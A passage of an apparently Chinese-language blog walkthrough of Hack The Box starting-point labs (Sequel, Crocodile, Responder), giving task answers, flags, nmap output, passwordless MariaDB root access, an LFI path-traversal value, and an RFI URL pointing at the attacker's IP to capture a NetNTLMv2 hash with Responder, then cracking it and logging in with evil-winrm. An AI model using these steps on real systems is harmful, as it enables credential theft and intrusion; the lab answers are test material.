<span class="hljs-keyword">to</span> the MariaDB monitor.  Commands <span class="hljs-keyword">end</span> <span class="hljs-keyword">with</span> ; <span class="hljs-keyword">or</span> \g.<br>Your MariaDB <span class="hljs-keyword">connection</span> id <span class="hljs-keyword">is</span> <span class="hljs-number">63</span><br><span class="hljs-keyword">Server</span> <span class="hljs-keyword">version</span>: <span class="hljs-number">10.3</span><span class="hljs-number">.27</span>-MariaDB<span class="hljs-number">-0</span>+deb10u1 Debian <span class="hljs-number">10</span><br><br>Copyright (c) <span class="hljs-number">2000</span>, <span class="hljs-number">2018</span>, Oracle, MariaDB Corporation Ab <span class="hljs-keyword">and</span> others.<br><br>Support MariaDB developers <span class="hljs-keyword">by</span> giving a star at https://github.com/MariaDB/<span class="hljs-keyword">server</span><br><span class="hljs-keyword">Type</span> <span class="hljs-string">&#x27;help;&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;\h&#x27;</span> <span class="hljs-keyword">for</span> help. <span class="hljs-keyword">Type</span> <span class="hljs-string">&#x27;\c&#x27;</span> <span class="hljs-keyword">to</span> clear the <span class="hljs-keyword">current</span> <span class="hljs-keyword">input</span> <span class="hljs-keyword">statement</span>.<br><br>MariaDB [(<span class="hljs-keyword">none</span>)]&gt;<br></code></pre></td></tr></table></figure><p>可以看到是 <code>MariaDB</code></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What community-developed MySQL <span class="hljs-built_in">version</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> target <span class="hljs-built_in">running</span>?<br>:MariaDB<br></code></pre></td></tr></table></figure><h3 id="Task-3-1"><a href="#Task-3-1" class="headerlink" title="Task 3"></a>Task 3</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">When</span> <span class="hljs-keyword">using</span> the MySQL command <span class="hljs-type">line</span> client, what switch <span class="hljs-keyword">do</span> we need <span class="hljs-keyword">to</span> use <span class="hljs-keyword">in</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">to</span> specify a <span class="hljs-keyword">login</span> username?<br>:-u<br></code></pre></td></tr></table></figure><h3 id="Task-4-1"><a href="#Task-4-1" class="headerlink" title="Task 4"></a>Task 4</h3><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali">Which username allows us to log into this MariaDB<span class="hljs-built_in"> instance </span>without providing a password?<span class="hljs-keyword"></span><br><span class="hljs-keyword">:root</span><br></code></pre></td></tr></table></figure><h3 id="Task-5-1"><a href="#Task-5-1" class="headerlink" title="Task 5"></a>Task 5</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">In SQL, what <span class="hljs-selector-tag">symbol</span> can we <span class="hljs-selector-tag">use</span> <span class="hljs-selector-tag">to</span> specify within the query that we want <span class="hljs-selector-tag">to</span> <span class="hljs-attribute">display</span> everything inside <span class="hljs-selector-tag">a</span> <span class="hljs-selector-tag">table</span>?<br>:*<br></code></pre></td></tr></table></figure><h3 id="Task-6-1"><a href="#Task-6-1" class="headerlink" title="Task 6"></a>Task 6</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">In</span> <span class="hljs-keyword">SQL</span>, what symbol <span class="hljs-keyword">do</span> we need <span class="hljs-keyword">to</span> <span class="hljs-keyword">end</span> <span class="hljs-keyword">each</span> query <span class="hljs-keyword">with</span>?<br>:;<br></code></pre></td></tr></table></figure><h3 id="Task-7-1"><a href="#Task-7-1" class="headerlink" title="Task 7"></a>Task 7</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">MariaDB [(none)]&gt; show databases;<br><span class="hljs-code">+--------------------+</span><br><span class="hljs-section">| Database           |</span><br><span class="hljs-section">+--------------------+</span><br>| htb                |<br>| information<span class="hljs-emphasis">_schema |</span><br><span class="hljs-emphasis">| mysql              |</span><br><span class="hljs-emphasis">| performance_</span>schema |<br><span class="hljs-code">+--------------------+</span><br>4 rows in set (0.353 sec)<br></code></pre></td></tr></table></figure><p>使用 <code>show databases;</code>查看数据库</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali">There are three databases in this MySQL<span class="hljs-built_in"> instance </span>that are common across all MySQL instances. What is the name of the fourth that&#x27;s unique to this host?<span class="hljs-keyword"></span><br><span class="hljs-keyword">:htb</span><br></code></pre></td></tr></table></figure><h3 id="Submit-Flag-1"><a href="#Submit-Flag-1" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><p><code>information_schema，mysql，performance_schema</code> 这几个数据库是 MySQL 自带的，一般来说是四个默认库，还有一个 <code>sys</code> 库。所以我们查找东西也是从 <code>htb</code> &#96; 查找</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">MariaDB [(none)]&gt; use htb<br>Reading table information for completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br>MariaDB [htb]&gt; show tables;<br>+---------------+<br>|<span class="hljs-string"> Tables_in_htb </span>|<br>+---------------+<br>|<span class="hljs-string"> config        </span>|<br>|<span class="hljs-string"> users         </span>|<br>+---------------+<br>2 rows in set (0.335 sec)<br><br>MariaDB [htb]&gt; select <span class="hljs-symbol">*</span> from config;<br>+----+-----------------------+----------------------------------+<br>|<span class="hljs-string"> id </span>|<span class="hljs-string"> name                  </span>|<span class="hljs-string"> value                            </span>|<br>+----+-----------------------+----------------------------------+<br>|<span class="hljs-string">  1 </span>|<span class="hljs-string"> timeout               </span>|<span class="hljs-string"> 60s                              </span>|<br>|<span class="hljs-string">  2 </span>|<span class="hljs-string"> security              </span>|<span class="hljs-string"> default                          </span>|<br>|<span class="hljs-string">  3 </span>|<span class="hljs-string"> auto_logon            </span>|<span class="hljs-string"> false                            </span>|<br>|<span class="hljs-string">  4 </span>|<span class="hljs-string"> max_size              </span>|<span class="hljs-string"> 2M                               </span>|<br>|<span class="hljs-string">  5 </span>|<span class="hljs-string"> flag                  </span>|<span class="hljs-string"> 7b4bec00d1a39e3dd4e021ec3d915da8 </span>|<br>|<span class="hljs-string">  6 </span>|<span class="hljs-string"> enable_uploads        </span>|<span class="hljs-string"> false                            </span>|<br>|<span class="hljs-string">  7 </span>|<span class="hljs-string"> authentication_method </span>|<span class="hljs-string"> radius                           </span>|<br>+----+-----------------------+----------------------------------+<br>7 rows in set (0.332 sec)<br></code></pre></td></tr></table></figure><p>简单的 sql 查询语句查询</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">Submit</span> root flag<br>:<span class="hljs-number">7</span>b4bec00d1a39e3dd4e021ec3d915da8<br></code></pre></td></tr></table></figure><h2 id="Crocodile"><a href="#Crocodile" class="headerlink" title="Crocodile"></a>Crocodile</h2><h3 id="Task-1-2"><a href="#Task-1-2" class="headerlink" title="Task 1"></a>Task 1</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">What Nmap <span class="hljs-keyword">scanning </span><span class="hljs-keyword">switch </span>employs the use of default <span class="hljs-keyword">scripts </span>during a <span class="hljs-keyword">scan?</span><br><span class="hljs-keyword"></span>:-<span class="hljs-keyword">sC</span><br></code></pre></td></tr></table></figure><h3 id="Task-2-2"><a href="#Task-2-2" class="headerlink" title="Task 2"></a>Task 2</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">┌──(root㉿butt3rf1y)-[/home/butt3rf1y]<br>└─<span class="hljs-comment"># nmap -sS -sV -Pn 10.129.1.15</span><br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( <span class="hljs-keyword">https</span>://nmap.org ) <span class="hljs-keyword">at</span> <span class="hljs-number">2025</span><span class="hljs-number">-02</span><span class="hljs-number">-19</span> <span class="hljs-number">01</span>:<span class="hljs-number">18</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span><span class="hljs-number">.1</span><span class="hljs-number">.15</span><br>Host is up (<span class="hljs-number">0.95</span>s latency).<br>Not shown: <span class="hljs-number">998</span> closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">21</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">ftp</span>     vsftpd <span class="hljs-number">3.0</span><span class="hljs-number">.3</span><br><span class="hljs-number">80</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>    Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.41</span> ((Ubuntu))<br>Service Info: OS: Unix<br></code></pre></td></tr></table></figure><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What service <span class="hljs-built_in">version</span> <span class="hljs-keyword">is</span> found <span class="hljs-keyword">to</span> be <span class="hljs-built_in">running</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">21</span>?<br>:vsftpd <span class="hljs-number">3.0</span><span class="hljs-number">.3</span><br></code></pre></td></tr></table></figure><h3 id="Task-3-2"><a href="#Task-3-2" class="headerlink" title="Task 3"></a>Task 3</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What FTP code <span class="hljs-keyword">is</span> returned <span class="hljs-keyword">to</span> us <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> <span class="hljs-string">&quot;Anonymous FTP login allowed&quot;</span> message?<br>:<span class="hljs-number">230</span><br></code></pre></td></tr></table></figure><h3 id="Task-4-2"><a href="#Task-4-2" class="headerlink" title="Task 4"></a>Task 4</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">After connecting <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> FTP server <span class="hljs-keyword">using</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">ftp</span> client, what username <span class="hljs-built_in">do</span> we provide when prompted <span class="hljs-built_in">to</span> <span class="hljs-built_in">log</span> <span class="hljs-keyword">in</span> anonymously?<br>:anonymous<br></code></pre></td></tr></table></figure><h3 id="Task-5-2"><a href="#Task-5-2" class="headerlink" title="Task 5"></a>Task 5</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">After</span> connecting <span class="hljs-keyword">to</span> the FTP <span class="hljs-keyword">server</span> anonymously, what command can we use <span class="hljs-keyword">to</span> download the files we find <span class="hljs-keyword">on</span> the FTP <span class="hljs-keyword">server</span>?<br>:<span class="hljs-keyword">get</span><br></code></pre></td></tr></table></figure><h3 id="Task-6-2"><a href="#Task-6-2" class="headerlink" title="Task 6"></a>Task 6</h3><p>用 <code>get</code> 传下来，可以看到是 <code>admin</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/bb5a428db75020be.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-literal">one</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> higher-privilege sounding usernames <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;allowed.userlist&#x27;</span> that we download <span class="hljs-built_in">from</span> <span class="hljs-keyword">the</span> FTP server?<br>:admin<br></code></pre></td></tr></table></figure><h3 id="Task-7-2"><a href="#Task-7-2" class="headerlink" title="Task 7"></a>Task 7</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What <span class="hljs-built_in">version</span> <span class="hljs-keyword">of</span> Apache HTTP Server <span class="hljs-keyword">is</span> <span class="hljs-built_in">running</span> <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> target host?<br>:Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.41</span><br></code></pre></td></tr></table></figure><h3 id="Task-8-1"><a href="#Task-8-1" class="headerlink" title="Task 8"></a>Task 8</h3><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">What <span class="hljs-keyword">switch</span> can we <span class="hljs-keyword">use</span> <span class="hljs-keyword">with</span> Gobuster to specify we are looking <span class="hljs-keyword">for</span> specific filetypes?<br>:-x<br></code></pre></td></tr></table></figure><h3 id="Task-9-1"><a href="#Task-9-1" class="headerlink" title="Task 9"></a>Task 9</h3><p>扫目录扫到 <code>login.php</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/817d73711a6e521a.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Which PHP <span class="hljs-built_in">file</span> can we identify <span class="hljs-keyword">with</span> <span class="hljs-built_in">directory</span> brute force that will provide <span class="hljs-keyword">the</span> opportunity <span class="hljs-built_in">to</span> authenticate <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> web service?<br>:login.php<br></code></pre></td></tr></table></figure><h3 id="Submit-Flag-2"><a href="#Submit-Flag-2" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><p>把 <code>allowed.userlist.passwd</code> 传下来，里面有密码，使用 <code>admin:rKXM59ESxesUFHAd</code> 登录</p><p><img src="https://img.dkdun.cn/v1/2025/12/666a284f93314fa3.png"></p><p>进去就是 flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/871d943e7b05148c.png"></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">Submit</span> root flag<br>:c7110277ac44d78b6a9fff2232434d16<br></code></pre></td></tr></table></figure><h2 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h2><h3 id="Task-1-3"><a href="#Task-1-3" class="headerlink" title="Task 1"></a>Task 1</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vim">┌──(root㉿butt3rf1y)-[/home/butt3rf1y]<br>└─# <span class="hljs-keyword">nmap</span> -sS -sV -Pn <span class="hljs-number">10.129</span>.<span class="hljs-number">40.166</span><br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://<span class="hljs-keyword">nmap</span>.org ) at <span class="hljs-number">2025</span>-<span class="hljs-number">02</span>-<span class="hljs-number">19</span> <span class="hljs-number">01</span>:<span class="hljs-number">52</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">40.166</span><br>Host <span class="hljs-keyword">is</span> <span class="hljs-keyword">up</span> (<span class="hljs-number">0.37</span>s latency).<br>Not shown: <span class="hljs-number">999</span> filtered tcp ports (<span class="hljs-keyword">no</span>-response)<br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">80</span>/tcp <span class="hljs-keyword">open</span>  http    Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">52</span> ((Win64) OpenSSL/<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span><span class="hljs-keyword">m</span> PHP/<span class="hljs-number">8.1</span>.<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>访问 80 端口</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">When visiting <span class="hljs-keyword">the</span> web service <span class="hljs-keyword">using</span> <span class="hljs-keyword">the</span> IP address, what is <span class="hljs-keyword">the</span> domain that we are being redirected <span class="hljs-built_in">to</span>?<br>:unika.htb<br></code></pre></td></tr></table></figure><h3 id="Task-2-3"><a href="#Task-2-3" class="headerlink" title="Task 2"></a>Task 2</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Which scripting <span class="hljs-keyword">language</span> <span class="hljs-keyword">is</span> being used <span class="hljs-keyword">on</span> the <span class="hljs-keyword">server</span> <span class="hljs-keyword">to</span> generate webpages?<br>:php<br></code></pre></td></tr></table></figure><h3 id="Task-3-3"><a href="#Task-3-3" class="headerlink" title="Task 3"></a>Task 3</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">the</span> name <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">URL</span> parameter which is used <span class="hljs-built_in">to</span> <span class="hljs-built_in">load</span> different language versions <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> webpage?<br>:page<br></code></pre></td></tr></table></figure><h3 id="Task-4-3"><a href="#Task-4-3" class="headerlink" title="Task 4"></a>Task 4</h3><p>本地文件包含 (LFI)，就是读取一些系统本地的敏感信息，一般通过路径来读取</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">Which of the following values <span class="hljs-keyword">for</span> the `page` <span class="hljs-keyword">parameter</span> would <span class="hljs-comment">be an example of exploiting a Local File Include (LFI) vulnerability:</span> <span class="hljs-comment">&quot;french.html&quot;</span><span class="hljs-comment">,</span> <span class="hljs-comment">&quot;//10.10.14.6/somefile&quot;</span><span class="hljs-comment">,</span> <span class="hljs-comment">&quot;../../../../../../../../windows/system32/drivers/etc/hosts&quot;</span><span class="hljs-comment">,</span> <span class="hljs-comment">&quot;minikatz.exe&quot;</span><br>:../../../../../../../../windows/system32/drivers/etc/hosts<br></code></pre></td></tr></table></figure><h3 id="Task-5-3"><a href="#Task-5-3" class="headerlink" title="Task 5"></a>Task 5</h3><p>远程文件包含，参数一般是一个远程的 url 地址</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">Which</span> of the following values <span class="hljs-keyword">for</span> the `page` parameter would be <span class="hljs-keyword">an</span> example of exploiting a Remote <span class="hljs-keyword">File</span> <span class="hljs-keyword">Include</span> (RFI) vulnerability: <span class="hljs-string">&quot;french.html&quot;</span>, <span class="hljs-string">&quot;//10.10.14.6/somefile&quot;</span>, <span class="hljs-string">&quot;../../../../../../../../windows/system32/drivers/etc/hosts&quot;</span>, <span class="hljs-string">&quot;minikatz.exe&quot;</span><br>:<span class="hljs-comment">//10.10.14.6/somefile</span><br></code></pre></td></tr></table></figure><h3 id="Task-6-3"><a href="#Task-6-3" class="headerlink" title="Task 6"></a>Task 6</h3><p>简单了解了一下 NTLM，New Technology LAN Manager，是微软用于 Windows 身份验证的一个协议。官方说的是：</p><p> NTLM 身份验证协议根据一种证明是服务器或域控制器的挑战&#x2F;响应机制对用户和计算机进行身份验证，用户要知道该服务器和域控制器的与帐户关联的密码。 在使用 NTLM 协议时，每当需要新的访问令牌时，资源服务器必须执行以下操作之一来验证计算机或用户的身份：</p><ul><li>如果计算机或用户的帐户是域帐户，请联系域控制器的部门域认证服务来获取该帐户的域。</li><li>如果该计算机或用户的帐户是本地帐户，请在本地帐户数据库中查找该帐户。</li></ul><p>官方确实太官方了，说白了就是 <code>challenge/response</code> 认证机制在验证用户的过程中是不需要传输用户的明文密码的。</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">What does NTLM stand <span class="hljs-keyword">for</span>?<br>:<span class="hljs-keyword">New</span> Technology LAN Manager<br></code></pre></td></tr></table></figure><h3 id="Task-7-3"><a href="#Task-7-3" class="headerlink" title="Task 7"></a>Task 7</h3><p>Responder 是一款少有的可以通过中继 NTLMv2哈希来获取网络中机器的 shell 访问权限的内网工具，详细了解可以看  <a href="https://ew1z4rd.github.io/post/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/">https://ew1z4rd.github.io/post/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/</a> 这篇文章，这个工具 kali 自带</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-title class_">Which</span> flag <span class="hljs-keyword">do</span> we <span class="hljs-keyword">use</span> <span class="hljs-keyword">in</span> the <span class="hljs-title class_">Responder</span> utility to specify the network interface?<br><span class="hljs-symbol">:-I</span><br></code></pre></td></tr></table></figure><h3 id="Task-8-2"><a href="#Task-8-2" class="headerlink" title="Task 8"></a>Task 8</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">There are several tools <span class="hljs-keyword">that</span> take a NetNTLMv2 challenge/response <span class="hljs-keyword">and</span> <span class="hljs-keyword">try</span> millions <span class="hljs-keyword">of</span> passwords <span class="hljs-keyword">to</span> see <span class="hljs-keyword">if</span> any <span class="hljs-keyword">of</span> them generate <span class="hljs-keyword">the</span> same response. One such tool <span class="hljs-keyword">is</span> often referred <span class="hljs-keyword">to</span> <span class="hljs-keyword">as</span> `john`, <span class="hljs-keyword">but</span> <span class="hljs-keyword">the</span> full <span class="hljs-built_in">name</span> <span class="hljs-keyword">is</span> what?.<br>:John The Ripper<br></code></pre></td></tr></table></figure><h3 id="Task-9-2"><a href="#Task-9-2" class="headerlink" title="Task 9"></a>Task 9</h3><p>指定 </p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">responder -<span class="hljs-selector-tag">I</span> tun0<br></code></pre></td></tr></table></figure><p>然后访问一个不存在的文件让它报错</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//u</span>nika.htb<span class="hljs-regexp">/?page=/</span><span class="hljs-regexp">/10.10.16.51/</span>butt3rf1y<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/cb8b139a7a41f58e.png"></p><p>把 <code>Hash</code> 那串复制下来爆破，但是我用 john 破解的时候出现了如下报错</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿butt3rf1y)-[/home/butt3rf1y]<br>└─# john b.txt<br><span class="hljs-keyword">Using</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">input</span> <span class="hljs-keyword">encoding</span>: UTF<span class="hljs-number">-8</span><br>Loaded <span class="hljs-number">1</span> <span class="hljs-keyword">password</span> hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 <span class="hljs-number">32</span>/<span class="hljs-number">64</span>])<br><span class="hljs-keyword">No</span> <span class="hljs-keyword">password</span> hashes left <span class="hljs-keyword">to</span> crack (see FAQ)<br></code></pre></td></tr></table></figure><p>查了一番才知道，这个报错原因是因为这个文件被破解过（哪来的啊？？？why？？？），结果就在 john.pot 中</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">┌──(root㉿butt3rf1y)-[<span class="hljs-regexp">/home/</span>butt3rf1y]<br>└─<span class="hljs-comment"># cat ~/.john/john.pot</span><br><span class="hljs-variable">$P</span><span class="hljs-variable">$BtP9ZghJTwDfSn1gKKc</span>.k3mq4Vo.Ko/:<span class="hljs-number">104567</span><br><span class="hljs-variable">$NETNTLMv2</span><span class="hljs-variable">$ADMINISTRATORRESPONDER</span><span class="hljs-variable">$25d61c9246d5479b</span><span class="hljs-variable">$1d382c449a1d964839832984788288f4</span><span class="hljs-variable">$010100000000000080b7bdeb8282db01d76b82bee9aff7d70000000002000800340059004d00370001001e00570049004e002d00470050004b0032004f0054005600460030004800360004003400570049004e002d00470050004b0032004f005400560046003000480036002e00340059004d0037002e004c004f00430041004c0003001400340059004d0037002e004c004f00430041004c0005001400340059004d0037002e004c004f00430041004c000700080080b7bdeb8282db01060004000200000008003000300000000000000001000000002000005ac722d42e809e0b0701cfcf2610b582b82cb93eb9627709f712e596b9e1fec00a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00350031000000000000000000</span>:badminton<br></code></pre></td></tr></table></figure><p>或者用 –show 来查看</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby">┌──(root㉿butt3rf1y)-[<span class="hljs-regexp">/home/butt</span>3rf1y]<br>└─<span class="hljs-comment"># john --show b.txt</span><br><span class="hljs-title class_">Administrator</span><span class="hljs-symbol">:badminton</span><span class="hljs-symbol">:RESPONDER</span><span class="hljs-symbol">:</span>25<span class="hljs-symbol">d61c9246d5479b:</span>1<span class="hljs-symbol">D382C449A1D964839832984788288F4:</span>010100000000000080B7BDEB8282DB01D76B82BEE9AFF7D70000000002000800340059004D00370001001E00570049004E002D00470050004B0032004F0054005600460030004800360004003400570049004E002D00470050004B0032004F005400560046003000480036002E00340059004D0037002E004C004F00430041004C0003001400340059004D0037002E004C004F00430041004C0005001400340059004D0037002E004C004F00430041004C000700080080B7BDEB8282DB01060004000200000008003000300000000000000001000000002000005AC722D42E809E0B0701CFCF2610B582B82CB93EB9627709F712E596B9E1FEC00A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00350031000000000000000000<br></code></pre></td></tr></table></figure><p>密码是 <code>badminton</code> </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> the <span class="hljs-keyword">password</span> <span class="hljs-keyword">for</span> the administrator <span class="hljs-keyword">user</span>?<br>:badminton<br></code></pre></td></tr></table></figure><h3 id="Task-10-1"><a href="#Task-10-1" class="headerlink" title="Task 10"></a>Task 10</h3><p>nmap 扫</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">We<span class="hljs-comment">&#x27;ll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?</span><br>:<span class="hljs-number">5985</span><br></code></pre></td></tr></table></figure><h3 id="Submit-Flag-3"><a href="#Submit-Flag-3" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><p>5985 主要是 <code>WinRM</code>（Windows Remote Managementd）,Windows 的远程管理，使用 WinRM 可以在对方有设置防火墙的情况下远程管理这台服务器，因为启动 WinRM 服务后，防火墙默认会放行 5985 端口。</p><p><a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a>，kali 自带</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">evil-winrm -<span class="hljs-selector-tag">i</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">40.166</span> -u administrator -<span class="hljs-selector-tag">p</span> badminton<br></code></pre></td></tr></table></figure><p>登进去之后发现啥也没有，一直找，找到了个 <code>mike</code> 用户</p><p><img src="https://img.dkdun.cn/v1/2025/12/20560db0a57c4adb.png"></p><p>在 <code>mike</code> 用户下找到 flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/47ed4fe5b5551c29.png"></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span 